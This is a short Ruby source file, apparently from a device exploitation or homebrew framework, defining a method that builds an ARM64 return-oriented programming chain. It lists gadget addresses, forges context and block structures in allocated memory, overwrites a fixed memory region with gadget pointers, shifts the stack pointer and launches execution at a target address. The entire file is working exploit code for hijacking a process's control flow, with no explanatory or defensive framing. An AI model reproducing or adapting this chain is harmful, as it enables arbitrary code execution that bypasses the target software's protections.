def ropcall
  sp = self.sp
  jaddr = mref(0x39FEEC)
  fixed = mref(0x91F320).cast Types::Uint64
  temp_flag "jaddr", jaddr
  temp_flag "fixed", fixed
  
  saved = fixed.read(12*4)

  # gadgets
  load_x0_w1_x2_x9_blr_x9 = mref(0x4967F0); temp_flag "load_x0_w1_x2_x9_blr_x9", load_x0_w1_x2_x9_blr_x9
  load_x2_x30_mov_sp_into_x2_br_x30 = mref(0x433EB4); temp_flag "load_x2_x30_mov_sp_into_x2_br_x30", load_x2_x30_mov_sp_into_x2_br_x30
  load_x2_x8_br_x2 = mref(0x1A1C98); temp_flag "load_x2_x8_br_x2", load_x2_x8_br_x2
  load_x30_from_sp_br_x2 = mref(0x3C2314); temp_flag "load_x30_from_sp_br_x2", load_x30_from_sp_br_x2
  returngadg = mref(0x181E9C); temp_flag "returngadg", returngadg

  savegadg = mref(0x4336B0); temp_flag "savegadg", savegadg
  loadgadg = mref(0x433620); temp_flag "loadgadg", loadgadg
  loadgadg_stage2 = mref(0x3A869C); temp_flag "loadgadg_stage2", loadgadg_stage2

  load_x19 = mref(0x6C3E4); temp_flag "load_x19", load_x19
  str_x20 = mref(0x117330); temp_flag "str_x20", str_x20
  str_x8 = mref(0x453530); temp_flag "str_x8", str_x8
  load_and_str_x8 = mref(0x474A98); temp_flag "load_and_str_x8", load_and_str_x8
  str_x1 = mref(0x581B8C); temp_flag "str_x1", str_x1
  mov_x2_into_x1 = mref(0x1A0454); temp_flag "mov_x2_into_x1", mov_x2_into_x1
  str_x0 = mref(0xFDF4C); temp_flag "str_x0", str_x0
  str_x9 = mref(0x1F8280); temp_flag "str_x9", str_x9
  mov_x19_into_x0 = mref(0x12CC68); temp_flag "mov_x19_into_x0", mov_x19_into_x0
  # end gadgets
  
  context_load_struct = malloc(0x200).cast Types::Uint64
  block_struct_1 = malloc(0x200).cast Types::Uint64
  block_struct_2 = malloc(0x200).cast Types::Uint64
  block_struct_3 = malloc(0x200).cast Types::Uint64
  savearea = malloc(0x400).cast Types::Uint64
  loadarea = malloc(0x400).cast Types::Uint64
  dumparea = malloc(0x400).cast Types::Uint64
  temp_flag "ctx_load", context_load_struct
  temp_flag "block_struct_1", block_struct_1
  temp_flag "block_struct_2", block_struct_2
  temp_flag "savearea", savearea
  temp_flag "loadarea", loadarea
  temp_flag "dumparea", dumparea

  (fixed + (0x00 >> 3)).deref = context_load_struct
  (fixed + (0x08 >> 3)).deref = load_x0_w1_x2_x9_blr_x9
  (fixed + (0x10 >> 3)).deref = load_x2_x30_mov_sp_into_x2_br_x30
  (fixed + (0x18 >> 3)).deref = load_x0_w1_x2_x9_blr_x9
  (fixed + (0x28 >> 3)).deref = block_struct_1

  sp = sp - 0x8030
  (context_load_struct + (0x058 >> 3)).deref = load_x2_x8_br_x2
  (context_load_struct + (0x068 >> 3)).deref = sp
  (context_load_struct + (0x158 >> 3)).deref = returngadg
  (context_load_struct + (0x168 >> 3)).deref = (sp + 0x8030)

  (block_struct_1 + (0x00 >> 3)).deref = savearea
  (block_struct_1 + (0x10 >> 3)).deref = load_x30_from_sp_br_x2
  (block_struct_1 + (0x18 >> 3)).deref = load_x0_w1_x2_x9_blr_x9
  (block_struct_1 + (0x28 >> 3)).deref = block_struct_2
  (block_struct_1 + (0x38 >> 3)).deref = savegadg

  start(jaddr, [], [], [])
end
